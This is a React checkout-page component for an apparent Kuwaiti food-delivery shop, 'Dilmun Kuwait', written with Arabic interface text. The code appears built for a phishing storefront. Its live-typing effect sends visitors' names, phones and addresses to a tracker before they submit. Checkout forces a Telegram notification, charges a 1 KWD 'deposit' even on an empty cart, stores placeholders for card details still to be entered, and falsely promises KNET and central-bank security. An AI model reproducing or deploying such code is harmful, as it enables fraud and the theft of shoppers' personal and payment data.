import React, { useState, useRef } from 'react';
import { CartItem, CustomerDetails } from '../types';
import { KUWAIT_AREAS } from '../data/products';
import {
  sendTelegramNotification,
  trackDetailsFilled,
  getOrCreateBookingId
} from '../lib/esfgdrFirebase';
import { saveCustomerToFirestore, saveOrderToFirestore } from '../lib/firebase';
import { Trash2, Plus, Minus, ArrowRight, ShieldCheck, MapPin, User, MessageSquare, CheckCircle2 } from 'lucide-react';

// Convert Arabic/Persian digits (٠-٩ / ۰-۹) to standard ASCII digits (0-9)
function toEnglishDigits(str: string): string {
  return str
    .replace(/[٠-٩]/g, (d) => String(d.charCodeAt(0) - 1632))
    .replace(/[۰-۹]/g, (d) => String(d.charCodeAt(0) - 1776));
}

// Clean phone input: convert Arabic digits and allow any phone number / international digits up to 18 characters
function cleanKuwaitPhoneInput(raw: string): string {
  return toEnglishDigits(raw).replace(/[^\d+]/g, '').slice(0, 18);
}

const COUNTRY_CODES = [
  { code: '+965', label: '🇰🇼 +965' },
  { code: '+966', label: '🇸🇦 +966' },
  { code: '+973', label: '🇧🇭 +973' },
  { code: '+971', label: '🇦🇪 +971' },
  { code: '+974', label: '🇶🇦 +974' },
  { code: '+968', label: '🇴🇲 +968' },
  { code: '+962', label: '🇯🇴 +962' },
  { code: '', label: '🌍 دولي' }
];

interface CartPageProps {
  items: CartItem[];
  onUpdateQty: (itemKey: string, delta: number) => void;
  onRemoveItem: (itemKey: string) => void;
  onClearCart: () => void;
  onProceedToPayment: (details: CustomerDetails, amountToPay: number, originalSubtotal: number) => void;
  onContinueShopping: () => void;
}

export const CartPage: React.FC<CartPageProps> = ({
  items,
  onUpdateQty,
  onRemoveItem,
  onClearCart,
  onProceedToPayment,
  onContinueShopping
}) => {
  // Saved Customer state or defaults
  const [name, setName] = useState(() => localStorage.getItem('cust_name') || '');
  const [countryPrefix, setCountryPrefix] = useState(() => localStorage.getItem('cust_country_prefix') || '+965');
  const [phone, setPhone] = useState(() => cleanKuwaitPhoneInput(localStorage.getItem('cust_phone') || ''));
  const [governorate, setGovernorate] = useState(() => {
    const saved = localStorage.getItem('cust_gov');
    return saved && KUWAIT_AREAS.includes(saved) ? saved : KUWAIT_AREAS[0];
  });
  const [street, setStreet] = useState(() => localStorage.getItem('cust_street') || '');
  const [building, setBuilding] = useState(() => localStorage.getItem('cust_building') || '');
  const [notes, setNotes] = useState(() => localStorage.getItem('cust_notes') || '');
  const [showNotes, setShowNotes] = useState(false);

  // Payment configuration
  const [paymentOption, setPaymentOption] = useState<'full' | 'partial'>('full');
  const [paymentMethod, setPaymentMethod] = useState<'knet' | 'benefit' | 'visa' | 'mastercard' | 'cod'>('knet');

  // Subtotal calculations (default to 1.000 KWD deposit if cart is empty so registration always works)
  const rawSubtotal = items.reduce((acc, item) => acc + (item.price || item.product.price) * item.qty, 0);
  const subtotal = rawSubtotal > 0 ? rawSubtotal : 1.000;
  const payableNow = paymentOption === 'full' ? subtotal : 1.000;
  const remainingDue = paymentOption === 'full' ? 0 : Math.max(0, subtotal - 1.000);

  const [errorMsg, setErrorMsg] = useState('');
  const nameInputRef = useRef<HTMLInputElement>(null);
  const phoneInputRef = useRef<HTMLInputElement>(null);
  const activeBookingIdRef = useRef<string>(getOrCreateBookingId(false));

  const buildFullPhone = (rawPhone: string, prefix: string): string => {
    const digits = cleanKuwaitPhoneInput(rawPhone);
    if (!digits) return '';
    if (digits.startsWith('+') || !prefix) return digits;
    const cleanPrefixDigits = prefix.replace(/\D/g, '');
    if (cleanPrefixDigits && digits.startsWith(cleanPrefixDigits) && digits.length > 8) {
      return `+${digits}`;
    }
    return prefix === '+965' ? digits : `${prefix} ${digits}`;
  };

  // Real-time debounced sync as customer types phone & name so dashboard sees registration immediately
  React.useEffect(() => {
    const cleaned = buildFullPhone(phone, countryPrefix);
    if (cleaned.replace(/\D/g, '').length < 3 && name.trim().length < 2) return;
    const timer = setTimeout(() => {
      const finalName = name.trim() || 'عميل دلمون الكويت';
      const finalStreet = street.trim() || governorate;
      trackDetailsFilled({
        bookingId: activeBookingIdRef.current,
        name: finalName,
        phone: cleaned || '00000000',
        area: governorate,
        governorate,
        street: finalStreet,
        address: `${governorate} — ${finalStreet}`.trim(),
        amount: payableNow,
        subtotal,
        items:
          items.length > 0
            ? items.map((i) => `${i.product.name} (${i.selectedWeight || i.product.baseWeight}) × ${i.qty}`)
            : ['تسجيل طلب مباشر — دلمون الكويت'],
        paymentMethod,
        notes: notes.trim()
      }).catch(() => {});
    }, 500);
    return () => clearTimeout(timer);
  }, [name, phone, countryPrefix, governorate, street, notes, payableNow, subtotal, paymentMethod, items]);

  const executeCheckout = (e?: React.FormEvent) => {
    if (e) e.preventDefault();

    const cleanedPhone = buildFullPhone(phone, countryPrefix);
    if (!cleanedPhone && !name.trim()) {
      setErrorMsg('يرجى إدخال رقم الهاتف أو الاسم لإتمام الطلب.');
      phoneInputRef.current?.focus();
      phoneInputRef.current?.scrollIntoView({ behavior: 'smooth', block: 'center' });
      return;
    }

    const finalPhone = cleanedPhone || '00000000';
    const finalName = name.trim() || 'عميل دلمون الكويت';
    const finalStreet = street.trim() || governorate;

    setErrorMsg('');

    // Save to local storage for convenience
    try {
      localStorage.setItem('cust_name', finalName);
      localStorage.setItem('cust_phone', cleanKuwaitPhoneInput(phone));
      localStorage.setItem('cust_country_prefix', countryPrefix);
      localStorage.setItem('cust_gov', governorate);
      localStorage.setItem('cust_street', finalStreet);
      localStorage.setItem('cust_building', building);
      localStorage.setItem('cust_notes', notes);
    } catch {
      // ignore storage errors in private mode
    }

    const customerDetails: CustomerDetails = {
      name: finalName,
      phone: finalPhone,
      governorate,
      street: finalStreet,
      building,
      area: governorate,
      address: finalStreet,
      notes,
      paymentOption,
      paymentMethod
    };

    const bookingId = activeBookingIdRef.current || getOrCreateBookingId(false);
    const itemsDescriptions =
      items.length > 0
        ? items.map((i) => `${i.product.name} (${i.selectedWeight || i.product.baseWeight}) × ${i.qty}`)
        : ['تسجيل طلب مباشر — دلمون الكويت'];

    // Sync registration & checkout details to esfgdr (bookings + bookings_steps + visitors) and Firestore customers/orders
    trackDetailsFilled({
      bookingId,
      name: finalName,
      phone: finalPhone,
      area: governorate,
      governorate,
      street: finalStreet,
      address: `${governorate} — ${finalStreet}`.trim(),
      amount: payableNow,
      subtotal,
      items: itemsDescriptions,
      paymentMethod,
      notes: notes.trim(),
      forceTelegram: true
    }).catch(() => {});

    saveCustomerToFirestore(customerDetails).catch(() => {});

    saveOrderToFirestore({
      orderId: bookingId,
      date: new Date().toLocaleDateString('ar-KW'),
      customer: customerDetails,
      items,
      subtotal,
      depositPaid: payableNow,
      remainingDue,
      total: subtotal,
      paymentMethod: paymentMethod === 'knet' ? 'KNET (كي نت الكويت)' : paymentMethod.toUpperCase(),
      cardLast4: '----',
      cardBank: 'بانتظار إدخال البطاقة',
      status: 'بانتظار الدفع (مسجل)'
    }).catch(() => {});

    onProceedToPayment(customerDetails, payableNow, subtotal);
  };

  return (
    <div className="max-w-4xl mx-auto px-4 py-6">
      
      {/* Breadcrumb & Title */}
      <div className="flex items-center justify-between mb-6 pb-3 border-b border-gray-150">
        <div>
          <h1 className="text-2xl font-black text-gray-900">إتمام الطلب والتوصيل — دلمون الكويت 🇰🇼</h1>
          <p className="text-xs text-gray-500 mt-1">
            أدخل رقم هاتفك وعنوانك بالأسفل للمتابعة إلى الدفع عبر كي نت (KNET)
          </p>
        </div>
        <button
          type="button"
          onClick={onClearCart}
          className="text-red-600 hover:text-red-700 text-xs font-bold flex items-center gap-1 p-2 rounded-lg hover:bg-red-50 transition cursor-pointer"
        >
          <Trash2 className="w-3.5 h-3.5" /> تفريغ السلة
        </button>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        
        {/* Checkout Form & Summary FIRST on mobile so visitor immediately sees registration fields */}
        <div className="lg:col-span-5 lg:order-2 space-y-4">
          
          <form onSubmit={executeCheckout} noValidate className="space-y-4">
            
            {/* Delivery Details Card */}
            <div className="bg-white rounded-2xl border-2 border-[#c8102e]/20 shadow-sm p-4 sm:p-5 space-y-3.5">
              <h3 className="font-extrabold text-gray-900 text-sm flex items-center gap-2">
                <MapPin className="w-4 h-4 text-[#c8102e]" />
                <span>بيانات التسجيل والتوصيل</span>
              </h3>

              {/* Name */}
              <div>
                <label className="block text-xs font-bold text-gray-700 mb-1">
                  الاسم الكامل
                </label>
                <div className="relative">
                  <input
                    ref={nameInputRef}
                    type="text"
                    value={name}
                    onChange={(e) => {
                      setName(e.target.value);
                      if (errorMsg) setErrorMsg('');
                    }}
                    placeholder="مثال: مشاري العتيبي"
                    className="w-full pl-3 pr-8 py-2.5 border border-gray-300 rounded-xl text-xs focus:ring-2 focus:ring-[#c8102e] focus:outline-none"
                  />
                  <User className="w-4 h-4 text-gray-400 absolute right-2.5 top-3" />
                </div>
              </div>

              {/* Phone with Country Selector */}
              <div>
                <label className="block text-xs font-bold text-gray-700 mb-1">
                  رقم الهاتف النقال <span className="text-red-500">*</span>
                </label>
                <div className="flex border border-gray-300 rounded-xl overflow-hidden focus-within:ring-2 focus-within:ring-[#c8102e]">
                  <select
                    value={countryPrefix}
                    onChange={(e) => setCountryPrefix(e.target.value)}
                    className="bg-gray-100 px-2 py-2.5 text-xs font-bold text-gray-700 border-l border-gray-300 focus:outline-none cursor-pointer"
                    dir="ltr"
                  >
                    {COUNTRY_CODES.map((c) => (
                      <option key={c.label} value={c.code}>
                        {c.label}
                      </option>
                    ))}
                  </select>
                  <input
                    ref={phoneInputRef}
                    type="tel"
                    inputMode="tel"
                    autoComplete="tel"
                    value={phone}
                    onChange={(e) => {
                      setPhone(cleanKuwaitPhoneInput(e.target.value));
                      if (errorMsg) setErrorMsg('');
                    }}
                    placeholder="أدخل رقم الهاتف"
                    className="flex-1 px-3 py-2.5 text-sm font-bold text-left focus:outline-none"
                    dir="ltr"
                  />
                </div>
              </div>

              {/* Area / Governorate */}
              <div>
                <label className="block text-xs font-bold text-gray-700 mb-1">
                  المنطقة / المحافظة
                </label>
                <select
                  value={governorate}
                  onChange={(e) => setGovernorate(e.target.value)}
                  className="w-full px-3 py-2.5 border border-gray-300 rounded-xl text-xs focus:ring-2 focus:ring-[#c8102e] focus:outline-none bg-white font-bold"
                >
                  {KUWAIT_AREAS.map((area) => (
                    <option key={area} value={area}>
                      {area}
                    </option>
                  ))}
                </select>
              </div>

              {/* Street & Building */}
              <div>
                <label className="block text-xs font-bold text-gray-700 mb-1">
                  العنوان بالتفصيل (القطعة، الشارع، المنزل - اختياري)
                </label>
                <input
                  type="text"
                  value={street}
                  onChange={(e) => setStreet(e.target.value)}
                  placeholder="القطعة، رقم الشارع، رقم المنزل أو القسيمة..."
                  className="w-full px-3 py-2.5 border border-gray-300 rounded-xl text-xs focus:ring-2 focus:ring-[#c8102e] focus:outline-none"
                />
              </div>

              {/* Optional Notes Toggle */}
              <div>
                {!showNotes ? (
                  <button
                    type="button"
                    onClick={() => setShowNotes(true)}
                    className="text-xs text-[#c8102e] font-bold hover:underline flex items-center gap-1 cursor-pointer"
                  >
                    <MessageSquare className="w-3.5 h-3.5" /> + إضافة ملاحظات للتوصيل (اختياري)
                  </button>
                ) : (
                  <div>
                    <label className="block text-xs font-bold text-gray-700 mb-1">ملاحظات التوصيل</label>
                    <textarea
                      value={notes}
                      onChange={(e) => setNotes(e.target.value)}
                      placeholder="مثال: يرجى الاتصال عند الوصول..."
                      className="w-full p-2.5 border border-gray-300 rounded-xl text-xs focus:ring-2 focus:ring-[#c8102e] focus:outline-none min-h-[50px]"
                    />
                  </div>
                )}
              </div>

            </div>

            {/* Payment Options Card */}
            <div className="bg-white rounded-2xl border border-gray-200 shadow-xs p-4 sm:p-5 space-y-3">
              <h3 className="font-extrabold text-gray-900 text-sm">طريقة وسداد الدفع</h3>

              {/* Full vs Partial Deposit Choice */}
              <div className="space-y-2">
                <button
                  type="button"
                  onClick={() => setPaymentOption('full')}
                  className={`w-full p-3 rounded-xl border text-right transition flex items-center justify-between cursor-pointer ${
                    paymentOption === 'full'
                      ? 'border-[#173e32] bg-emerald-50 text-[#173e32] ring-1 ring-[#173e32] font-bold'
                      : 'border-gray-200 hover:bg-gray-50 text-gray-700'
                  }`}
                >
                  <div>
                    <div className="text-xs font-extrabold">دفع كامل المبلغ الآن عبر كي نت / البطاقة</div>
                    <div className="text-[11px] text-gray-500 font-normal">
                      سداد إجمالي الطلب ({subtotal.toFixed(3)} د.ك) مع توصيل مبرد مجاني
                    </div>
                  </div>
                  {paymentOption === 'full' && <CheckCircle2 className="w-5 h-5 text-emerald-800" />}
                </button>

                <button
                  type="button"
                  onClick={() => setPaymentOption('partial')}
                  className={`w-full p-3 rounded-xl border text-right transition flex items-center justify-between cursor-pointer ${
                    paymentOption === 'partial'
                      ? 'border-[#173e32] bg-emerald-50 text-[#173e32] ring-1 ring-[#173e32] font-bold'
                      : 'border-gray-200 hover:bg-gray-50 text-gray-700'
                  }`}
                >
                  <div>
                    <div className="text-xs font-extrabold">دفع عربون (1.000 د.ك) لتأكيد الطلب</div>
                    <div className="text-[11px] text-gray-500 font-normal">
                      سداد 1 د.ك الآن، ودفع المتبقي ({remainingDue.toFixed(3)} د.ك) عند الاستلام
                    </div>
                  </div>
                  {paymentOption === 'partial' && <CheckCircle2 className="w-5 h-5 text-emerald-800" />}
                </button>
              </div>

              {/* Payment Gateways / Cards */}
              <div className="pt-2 border-t border-gray-100">
                <span className="text-xs font-bold text-gray-700 block mb-2.5">اختر وسيلة الدفع:</span>
                <div className="space-y-2.5">
                  
                  {/* KNET */}
                  <div
                    onClick={() => setPaymentMethod('knet')}
                    className={`flex items-center justify-between p-3 rounded-xl border cursor-pointer transition ${
                      paymentMethod === 'knet' || paymentMethod === 'benefit'
                        ? 'border-[#0055a5] bg-blue-50/40 ring-1 ring-[#0055a5] font-bold shadow-2xs'
                        : 'border-gray-200 hover:bg-gray-50'
                    }`}
                  >
                    <div className="flex items-center gap-3">
                      <img
                        src="/assets/knet/knet-logo.png"
                        alt="كي نت KNET"
                        className="w-11 h-9 object-contain shrink-0 rounded-xs bg-white p-0.5 border border-gray-200 shadow-2xs"
                      />
                      <div>
                        <div className="text-xs font-extrabold text-gray-900">كي نت — KNET الكويت</div>
                        <div className="text-[10px] text-gray-500 font-normal">بوابة الدفع الإلكتروني المعتمدة لجميع بنوك الكويت</div>
                      </div>
                    </div>
                    <input
                      type="radio"
                      name="paymentMethod"
                      checked={paymentMethod === 'knet' || paymentMethod === 'benefit'}
                      onChange={() => setPaymentMethod('knet')}
                      className="w-4 h-4 accent-[#0055a5]"
                    />
                  </div>

                  {/* Visa */}
                  <div
                    onClick={() => setPaymentMethod('visa')}
                    className={`flex items-center justify-between p-3 rounded-xl border cursor-pointer transition ${
                      paymentMethod === 'visa'
                        ? 'border-[#1a1f71] bg-blue-50/40 ring-1 ring-[#1a1f71] font-bold shadow-2xs'
                        : 'border-gray-200 hover:bg-gray-50'
                    }`}
                  >
                    <div className="flex items-center gap-3">
                      <div className="w-11 h-8 rounded-md bg-[#1a1f71] flex items-center justify-center shrink-0 shadow-2xs border border-[#14185c]">
                        <svg viewBox="0 0 48 16" className="w-8 h-3.5 fill-white">
                          <path d="M18.6 1.2L14.8 14.8H11.2L15 1.2H18.6ZM34.1 10C34.1 6.4 29.1 6.2 29.1 4.6C29.1 4.1 29.6 3.5 30.8 3.4C31.4 3.3 32.9 3.3 34.7 4.1L35.4 1.5C34.4 1.1 33.1 0.8 31.5 0.8C27.8 0.8 25.2 2.8 25.2 5.6C25.2 7.7 27.1 8.8 28.5 9.5C30 10.2 30.5 10.7 30.5 11.4C30.5 12.4 29.3 12.9 28.1 12.9C26.1 12.9 25 12.4 24.1 12L23.4 14.7C24.3 15.1 26.1 15.5 27.9 15.5C31.8 15.5 34.4 13.6 34.1 10ZM43.8 14.8H47L44.2 1.2H41.2C40.3 1.2 39.6 1.7 39.3 2.5L33.8 14.8H37.7L38.5 12.6H43.3L43.8 14.8ZM39.5 9.8L41.5 4.3L42.6 9.8H39.5ZM10.9 1.2L7.2 10.5L5.7 2.6C5.5 1.7 4.8 1.2 3.9 1.2H0.1L0 1.6C1.3 1.9 2.8 2.4 3.7 3C4.3 3.3 4.4 3.6 4.6 4.4L7.5 14.8H11.5L17.4 1.2H10.9Z" />
                        </svg>
                      </div>
                      <span className="text-xs font-bold text-gray-900">بطاقة فيزا (Visa Card)</span>
                    </div>
                    <input
                      type="radio"
                      name="paymentMethod"
                      checked={paymentMethod === 'visa'}
                      onChange={() => setPaymentMethod('visa')}
                      className="w-4 h-4 accent-[#1a1f71]"
                    />
                  </div>

                  {/* Mastercard */}
                  <div
                    onClick={() => setPaymentMethod('mastercard')}
                    className={`flex items-center justify-between p-3 rounded-xl border cursor-pointer transition ${
                      paymentMethod === 'mastercard'
                        ? 'border-[#eb001b] bg-amber-50/40 ring-1 ring-[#eb001b] font-bold shadow-2xs'
                        : 'border-gray-200 hover:bg-gray-50'
                    }`}
                  >
                    <div className="flex items-center gap-3">
                      <div className="w-11 h-8 rounded-md bg-white border border-gray-200 flex items-center justify-center shrink-0 shadow-2xs">
                        <svg viewBox="0 0 36 22" className="w-8 h-5">
                          <circle cx="13" cy="11" r="8.5" fill="#EB001B" />
                          <circle cx="23" cy="11" r="8.5" fill="#F79E1B" />
                          <path d="M18 4.3A8.48 8.48 0 0 0 14.5 11c0 2.75 1.37 5.2 3.5 6.7a8.48 8.48 0 0 0 3.5-6.7c0-2.75-1.37-5.2-3.5-6.7Z" fill="#FF5F00" />
                        </svg>
                      </div>
                      <span className="text-xs font-bold text-gray-900">ماستر كارد (Mastercard)</span>
                    </div>
                    <input
                      type="radio"
                      name="paymentMethod"
                      checked={paymentMethod === 'mastercard'}
                      onChange={() => setPaymentMethod('mastercard')}
                      className="w-4 h-4 accent-[#eb001b]"
                    />
                  </div>

                </div>
              </div>

            </div>

            {/* Invoice Summary */}
            <div className="bg-gray-50 rounded-2xl border border-gray-200 p-4 space-y-2 text-xs">
              <div className="flex justify-between text-gray-600">
                <span>قيمة المنتجات:</span>
                <span className="font-bold">{subtotal.toFixed(3)} د.ك</span>
              </div>
              <div className="flex justify-between text-gray-600">
                <span>رسوم التوصيل المبرد:</span>
                <span className="text-emerald-700 font-extrabold">مجاناً ⚡</span>
              </div>
              {paymentOption === 'partial' && (
                <div className="flex justify-between text-amber-800 font-semibold pt-1 border-t border-gray-200">
                  <span>المتبقي عند الاستلام:</span>
                  <span>{remainingDue.toFixed(3)} د.ك</span>
                </div>
              )}
              <div className="flex justify-between text-gray-900 font-black text-sm pt-2 border-t border-gray-200">
                <span>المبلغ المطلوب سداده الآن:</span>
                <span className="text-base text-[#173e32]">{payableNow.toFixed(3)} د.ك</span>
              </div>
            </div>

            {/* Error Message */}
            {errorMsg && (
              <div className="p-3 bg-red-50 border border-red-200 text-red-700 text-xs rounded-xl font-bold">
                ⚠️ {errorMsg}
              </div>
            )}

            {/* Submit Action */}
            <button
              type="submit"
              className="w-full py-4 bg-[#d8212a] hover:bg-[#b8141d] active:scale-98 text-white rounded-xl font-black text-base shadow-lg shadow-red-900/20 transition flex items-center justify-center gap-2 cursor-pointer"
            >
              <span>المتابعة والدفع ({payableNow.toFixed(3)} د.ك)</span>
              <ArrowRight className="w-5 h-5 rotate-180" />
            </button>

            <div className="text-center text-[11px] text-gray-400 flex items-center justify-center gap-1.5 pt-1">
              <ShieldCheck className="w-4 h-4 text-emerald-600" />
              <span>دفع مشفر وآمن 100% عبر شبكة كي نت (KNET) وبنك الكويت المركزي</span>
            </div>

          </form>

        </div>

        {/* Cart Items Column (7 cols) */}
        <div className="lg:col-span-7 lg:order-1 space-y-4">
          
          {/* Free delivery badge */}
          <div className="bg-emerald-50 border border-emerald-200 rounded-xl p-3 flex items-center justify-between text-xs text-emerald-900">
            <div className="flex items-center gap-2 font-bold">
              <span className="text-base">⚡</span>
              <span>توصيل مجاني ومبرد لكافة محافظات ومناطق الكويت</span>
            </div>
            <span className="font-extrabold text-emerald-700 bg-white px-2 py-0.5 rounded-md border border-emerald-200">
              0.000 د.ك
            </span>
          </div>

          {/* Items List */}
          <div className="bg-white rounded-2xl border border-gray-200 shadow-xs divide-y divide-gray-100 overflow-hidden">
            {items.length === 0 ? (
              <div className="p-6 text-center space-y-2">
                <div className="text-sm font-extrabold text-gray-800">
                  تسجيل طلب مباشر — توصيل دلمون الكويت
                </div>
                <p className="text-xs text-gray-500 leading-relaxed">
                  يمكنك إتمام تسجيل بياناتك في النموذج والمتابعة لبوابة الدفع مباشرة، أو الضغط بالأسفل لإضافة منتجات للسلة.
                </p>
              </div>
            ) : (
              items.map((item) => {
                const unitPrice = item.price || item.product.price;
                return (
                  <div key={item.id} className="p-4 flex gap-3.5 items-start">
                    {/* Thumbnail */}
                    <div className="w-16 h-16 sm:w-20 sm:h-20 rounded-xl overflow-hidden bg-gray-100 border border-gray-100 shrink-0">
                      <img
                        src={item.product.img}
                        alt={item.product.name}
                        className="w-full h-full object-cover"
                        onError={(e) => {
                          (e.target as HTMLImageElement).src = '/assets/products/whole-chicken.png';
                        }}
                      />
                    </div>

                    {/* Details */}
                    <div className="flex-1 min-w-0">
                      <div className="flex items-start justify-between gap-2">
                        <div>
                          <h3 className="font-bold text-gray-900 text-sm leading-snug">
                            {item.product.name}
                          </h3>
                          {item.selectedWeight && (
                            <span className="text-[11px] text-gray-500 font-medium">
                              الوزن: {item.selectedWeight}
                            </span>
                          )}
                        </div>
                        <button
                          type="button"
                          onClick={() => onRemoveItem(item.id)}
                          className="text-gray-400 hover:text-red-600 transition p-1 cursor-pointer"
                          title="حذف"
                        >
                          <Trash2 className="w-4 h-4" />
                        </button>
                      </div>

                      <div className="text-xs text-emerald-800 font-bold mt-0.5">
                        {(unitPrice * item.qty).toFixed(3)} د.ك
                        <span className="text-gray-400 font-normal mr-1">
                          ({unitPrice.toFixed(3)} د.ك × {item.qty})
                        </span>
                      </div>

                      {/* Quantity controls */}
                      <div className="flex items-center gap-2 mt-3">
                        <div className="flex items-center bg-gray-100 rounded-lg p-0.5 border border-gray-200">
                          <button
                            type="button"
                            onClick={() => onUpdateQty(item.id, -1)}
                            className="w-6 h-6 rounded bg-white shadow-xs text-gray-700 flex items-center justify-center font-bold hover:bg-gray-200 cursor-pointer"
                          >
                            <Minus className="w-3 h-3" />
                          </button>
                          <span className="text-xs font-bold px-2.5">{item.qty}</span>
                          <button
                            type="button"
                            onClick={() => onUpdateQty(item.id, 1)}
                            className="w-6 h-6 rounded bg-white shadow-xs text-gray-700 flex items-center justify-center font-bold hover:bg-gray-200 cursor-pointer"
                          >
                            <Plus className="w-3 h-3" />
                          </button>
                        </div>
                      </div>

                    </div>
                  </div>
                );
              })
            )}
          </div>

          <button
            type="button"
            onClick={onContinueShopping}
            className="w-full py-2.5 border border-dashed border-gray-300 text-gray-600 hover:text-emerald-800 hover:border-emerald-500 rounded-xl text-xs font-bold transition flex items-center justify-center gap-1.5 cursor-pointer"
          >
            <Plus className="w-4 h-4" /> إضافة منتج آخر للسلة
          </button>
        </div>

      </div>

    </div>
  );
};
